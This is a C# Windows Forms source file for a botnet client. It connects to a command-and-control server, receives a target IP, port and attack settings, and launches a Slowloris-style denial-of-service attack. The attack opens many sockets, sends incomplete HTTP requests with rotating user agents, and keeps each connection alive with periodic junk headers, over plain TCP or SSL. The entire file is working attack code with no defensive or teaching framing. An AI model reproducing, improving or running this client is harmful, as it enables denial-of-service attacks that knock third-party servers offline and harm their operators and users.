using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BotnetClient
{
    public partial class MainPanel : MetroFramework.Forms.MetroForm
    {
        // Client Socket
        Socket socket;
        // Client thread
        Thread clientThread;
        // Host Server Settings
        string serverIPV4 = "192.168.1.44"; // IPV4 of host server (for lan)
        Int32 serverPort = 11111; // Server Port
        // Attack Settings
        static string HostOrIP = "1.1.1.1"; // Victim's IP or hostname
        static int Port = 80; // Victim's port
        static bool UseSsl = false; // Will we use SSL when attacking?
        static bool restart = false; // If this gets set to true, the client will restart
        static int Delay = 15000; // Delay between keep alive data
        static int SockCount = 8; // How many connections to make?
        Boolean attacking = false; // Are we currently attacking?
        // Other Variables
        static Random Rand = new Random(); // Random number generator
        static string[] UserAgents = // User agent list
        {
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"
        };
        string previousLogMessage = "";

        /// <summary>
        /// MainPanel Function, this is the constructor for the window
        /// </summary>
        public MainPanel()
        {
            InitializeComponent();
            log("Starting client thread...");
            this.StyleManager = metroStyleManager1;
            connectionLogListView.Columns[0].Width = connectionLogListView.Width;
            clientThread = new Thread(() => clientSocketThread());
            clientThread.Start();
        }

        /// <summary>
        /// Main Client/Socket Thread
        /// </summary>
        public void clientSocketThread()
        {
            // Variables to manage the status of the Host-Server
            Boolean run = true;
            Boolean stayConnected = true;
            while (run)
            {
                try
                {
                    // Establish the remote endpoint for the socket. This example uses port 11111 on the local computer. 
                    IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                    IPAddress ipAddr;
                    try
                    {
                        // Try to set socket IP address to current IPV4 address (only works on wifi as of now)
                        ipAddr = IPAddress.Parse(serverIPV4);
                    }
                    catch (Exception e)
                    {
                        // Fail safe = grabbing some other ip address that only works when all clients are on same pc as host
                        ipAddr = ipHost.AddressList[0];
                    }
                    IPEndPoint localEndPoint = new IPEndPoint(ipAddr, serverPort);
                    // Creation TCP/IP Socket using Socket Class Costructor 
                    socket = new Socket(ipAddr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                    try
                    {
                        // Connect Socket to the remote endpoint using method Connect() 
                        log("Connecting to Host-Server...");
                        socket.Connect(localEndPoint);
                        log("Connected to " + ipAddr.ToString() + ":" + serverPort.ToString());
                        while (stayConnected)
                        {
                            // Send reponce message to Host-Server
                            // CURRENTLY DISABLED BECAUSE WE DONT NEED IT, BUT IF CONTINUOUS COMMUNICATION IS NEEDED IN THE FUTURE THIS IS WHERE IT WOULD GO
                            if (false)
                            {
                                string messageToSend = "[Alive: true], [RunningAttack: true]<EOF>";
                                byte[] messageSent = Encoding.ASCII.GetBytes(messageToSend);
                                log("Sending Message '" + messageToSend + "'...");
                                int byteSent = socket.Send(messageSent);
                            }

                            // Recieve Update from Host-Server
                            try
                            {
                                // Data buffer 
                                byte[] messageReceived = new byte[1024];
                                // Recieve message through data buffer
                                int byteRecv = socket.Receive(messageReceived);
                                // Convert message to string for parsing
                                string message = Encoding.ASCII.GetString(messageReceived, 0, byteRecv);
                                // Handle message types
                                if (message.Contains("["))
                                {
                                    if (message.Contains("ping!"))
                                    {
                                        // clear ping message if it somehow gets in here (we should probably fix this)
                                        message = message.Replace("ping!", "");
                                    }
                                    // Print split updates into string array
                                    log("Update: " + message);
                                    string[] updates = message.Split(',').Select(s => s.Trim().Substring(1, s.Length - 2)).ToArray();
                                    foreach (string item in updates)
                                    {
                                        try
                                        {
                                            if (item.Contains("IP:"))
                                            {
                                                HostOrIP = item.Substring(item.IndexOf(":") + 1);
                                            }
                                            else if (item.Contains("Port:"))
                                            {
                                                Port = int.Parse(item.Substring(item.IndexOf(":") + 1));
                                            }
                                            else if (item.Contains("Delay:"))
                                            {
                                                Delay = int.Parse(item.Substring(item.IndexOf(":") + 1));
                                            }
                                            else if (item.Contains("Sockets:"))
                                            {
                                                SockCount = int.Parse(item.Substring(item.IndexOf(":") + 1));
                                            }
                                            else if (item.Contains("UseSSL:"))
                                            {
                                                UseSsl = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
                                            }
                                            else if (item.Contains("Attack:"))
                                            {
                                                attacking = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
                                                if (attacking)
                                                {
                                                    log("Starting attack...");
                                                    for (int i = 0; SockCount > i; i++)
                                                    {
                                                        // Create sockets for attack
                                                        try { InitClient(new TcpClient()); } catch { }
                                                    }
                                                }
                                            }
                                            else if (item.Contains("Restart"))
                                            {
                                                // This needs some work... it doesnt directly cause the restart, but rather it triggers a bunch of exceptions and we call restart later again
                                                restart = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
                                                if (restart)
                                                {
                                                    Application.Restart();
                                                    Environment.Exit(0);
                                                }
                                            }
                                        } catch (Exception error)
                                        {
                                            log("Error parsing update... " + error.ToString());
                                        }
                                    }
                                }
                                else if (!message.Contains("ping!"))
                                {
                                    stayConnected = false;
                                }
                                // Increase updateCounter & sleep thread to improve performance
                                Thread.Sleep(1000);
                            } catch (Exception e){} // no message recieved
                        }
                        log("Disconnecting...");
                        // Close Socket using the method Close() 
                        try
                        {
                            socket.Shutdown(SocketShutdown.Both);
                            socket.Close();
                        }
                        catch (Exception e)
                        {
                            log("Error closing client socket... (it is probably already closed)");
                        }
                        run = false;
                        log("Disconnected.");
                    }
                    // Manage of Socket's Exceptions 
                    catch (ArgumentNullException ane)
                    {
                        log("ArgumentNullException : " + ane.ToString());
                    }
                    catch (SocketException se)
                    {
                        log("SocketException : " + se.ToString());
                    }
                    catch (Exception e)
                    {
                        log("Unexpected exception : " + e.ToString());
                    }
                }
                catch (Exception e)
                {
                    log(e.ToString());
                    if (restart)
                    {
                        // we have to also call restart here for some reason
                        log("Restarting...");
                        Application.Restart();
                        Environment.Exit(0);
                    }
                }
            }
        }

        /// <summary>
        /// log() function, used to display log messages to the user
        /// </summary>
        /// <param name="logMessage">Message to be displayed to user</param>
        public void log(string logMessage)
        {
            string raw = logMessage;
            // Build log message with date and message
            logMessage = "[" + DateTime.UtcNow + "] " + logMessage;
            if (raw != previousLogMessage)
            {
                // Write to console in case of exception
                Console.WriteLine(logMessage);
                try
                {
                    // Create new listviewitem for the log message
                    ListViewItem newItem = new ListViewItem();
                    newItem.Text = logMessage;
                    // Use Invoke() to access the log listview from other threads (very big brain)
                    connectionLogListView.Invoke((MethodInvoker)delegate {
                        // Running on the UI thread
                        connectionLogListView.Items.Add(newItem);
                        connectionLogListView.Columns[0].Width = connectionLogListView.Width - 5;
                        connectionLogListView.EnsureVisible(connectionLogListView.Items.Count - 1);
                    });
                    previousLogMessage = raw;
                }
                catch (Exception e)
                {
                    // ughhhhhhhhhhhhh something broke
                    Console.WriteLine("HEY SILLY, THIS IS PREVENTING THE LOG FROM WORKING: " + e.ToString());
                }
                try
                {
                    File.AppendAllText("log.txt", logMessage + Environment.NewLine);
                } catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
            }
        }

        /// <summary>
        /// Override method for form closing, makes sure that the sockets get closed when the program closes
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void MainPanel_FormClosing(object sender, FormClosingEventArgs e)
        {
            try {
                socket.Shutdown(SocketShutdown.Both);
            } catch (Exception er) { }
            try
            {
                socket.Close();
            }
            catch (Exception er) { }
            try
            {
                clientThread.Abort();
            }
            catch (Exception er) { }
        }







        // Attack Method (this need work/tweaking/overhaul)
        public void InitClient(TcpClient c)
        { 
            // GET request to random nonexistent location
            byte[] GET = Encoding.UTF8.GetBytes($"GET /?{Rand.Next(2000)} HTTP/1.1\r\n");
            // Random user agent
            byte[] UserAgent = Encoding.UTF8.GetBytes($"User-Agent: {UserAgents[Rand.Next(UserAgents.Length)]}"); 
            byte[] AcceptLanguage = Encoding.UTF8.GetBytes("Accept-Language: en-US,en,q=0.5");
            try
            {
                IPHostEntry hostInfo = Dns.Resolve(HostOrIP.Trim());
                // Resolve hostname and connect
                c.Connect(hostInfo.AddressList.Where(x => x.AddressFamily == AddressFamily.InterNetwork).First(), Port); 
                if (UseSsl)
                {
                    SocketSafe(c, () =>
                    {
                        log($"Initiating socket ({c.Client.LocalEndPoint})");

                        SslStream s = new SslStream(c.GetStream()); // Create SSL
                        log($"Authenticating with SSL ({c.Client.LocalEndPoint})");
                        s.AuthenticateAsClient(HostOrIP); // Authenticate
                        s.Write(GET, 0, GET.Length);
                        s.Write(UserAgent, 0, UserAgent.Length);
                        s.Write(AcceptLanguage, 0, AcceptLanguage.Length);
                        new Thread(x =>
                        {
                            SocketSafe(c, () =>
                            {
                                while (attacking)
                                {
                                    log($"Sending keep alive data... ({c.Client.LocalEndPoint})");
                                    byte[] XA = Encoding.UTF8.GetBytes($"X-a: {Rand.Next(5000)}");
                                    s.Write(XA, 0, XA.Length); // Send keep alive data to keep the connection open
                                    Thread.Sleep(Delay); // Wait
                                }
                                log("Attack Stopped");
                            });
                        }).Start();
                    });
                }
                else
                {
                    SocketSafe(c, () =>
                    {

                        log($"Initiating socket ({c.Client.LocalEndPoint})");
                        NetworkStream s = c.GetStream();
                        s.Write(GET, 0, GET.Length);
                        s.Write(UserAgent, 0, UserAgent.Length);
                        s.Write(AcceptLanguage, 0, AcceptLanguage.Length);
                        new Thread(x =>
                        {
                            SocketSafe(c, () =>
                            {
                                while (attacking)
                                {
                                    log($"Sending keep alive data... ({c.Client.LocalEndPoint})");
                                    byte[] XA = Encoding.UTF8.GetBytes($"X-a: {Rand.Next(5000)}");
                                    s.Write(XA, 0, XA.Length); // Send keep alive data to keep the connection open
                                    Thread.Sleep(Delay); // Wait
                                }
                                log("Attack Stopped");
                            });
                        }).Start();
                    });
                }
            }
            catch (Exception e) { log($"Error connecting:\r\n{e}"); }
        }
        public void SocketSafe(TcpClient c, Action a)
        {
            try
            {
                a();
            }
            catch (Exception e)
            {
                log($"Something went wrong, recreating socket:\r\n{e}");
                InitClient(c);
            }
        }
    }
}
